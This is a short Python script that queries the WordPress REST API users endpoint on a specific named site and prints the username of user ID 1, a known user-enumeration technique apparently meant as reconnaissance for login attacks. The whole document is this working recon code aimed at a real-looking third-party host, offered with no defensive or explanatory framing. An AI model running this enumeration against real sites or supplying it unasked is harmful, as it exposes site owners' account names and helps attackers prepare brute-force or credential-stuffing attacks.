#!/usr/bin/python3
import requests
import json
l0p = 1
RxR = requests.get('http://sy.sa/wp-json/wp/v2/users/' + str(l0p), timeout=5)
JsonTXT = json.loads(RxR.text)
if 'id' in JsonTXT:
    Usernamez = JsonTXT['name']
    print('Username: %s  '%(Usernamez))

